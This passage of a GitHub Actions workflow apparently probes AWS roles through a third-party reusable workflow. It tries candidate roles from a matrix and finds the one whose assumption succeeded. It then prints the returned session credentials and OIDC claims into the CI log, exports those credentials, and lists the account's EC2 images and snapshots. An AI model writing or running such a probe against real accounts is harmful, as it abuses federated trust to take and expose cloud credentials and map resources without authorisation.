            role: arn:aws:iam::125746528491:role/service-role/metricforge-recovery-workflows
    uses: yulmwu/metricforge-recovery-workflows/.github/workflows/restore.yml@6c35f1d1d7c74a9b2b0252a72d02700f6e6041e6
    with:
      mode: exchange
      entry_role: ${{ matrix.role }}
      nonce: sha_${{ matrix.id }}

  inspect:
    runs-on: ubuntu-latest
    needs: [assume_main, assume_sha]
    if: always()
    steps:
      - name: Download artifacts from probe
        uses: actions/download-artifact@v4
        with:
          path: artifacts
      - name: Locate successful role and list cloud evidence
        shell: bash
        run: |
          set -euo pipefail
          echo "ARTIFACTS"
          find artifacts -maxdepth 3 -type f -print | sort
          entry=$(find artifacts -path "*/entry.json" -print -quit)
          if [ -z "${entry}" ]; then
            echo "NO_SUCCESSFUL_ENTRY_ROLE"
            for c in $(find artifacts -name oidc-claims.json | sort | head -n 2); do echo "CLAIM=${c}"; cat "${c}"; done
            exit 2
          fi
          echo "ENTRY_JSON=${entry}"
          cat "${entry}"
          export AWS_ACCESS_KEY_ID=$(jq -r '.Credentials.AccessKeyId' "${entry}")
          export AWS_SECRET_ACCESS_KEY=$(jq -r '.Credentials.SecretAccessKey' "${entry}")
          export AWS_SESSION_TOKEN=$(jq -r '.Credentials.SessionToken' "${entry}")
          aws sts get-caller-identity
          aws ec2 describe-images --region ap-northeast-2 --owners 125746528491 --filters 'Name=name,Values=metricforge-recovery-*' --output json > images.json || true
          cat images.json || true
          jq -r '.Images[]? | [.ImageId,.Name,.CreationDate,((.BlockDeviceMappings[]? | select(.Ebs.SnapshotId) | .Ebs.SnapshotId) // "")] | @tsv' images.json 2>/dev/null | sort || true
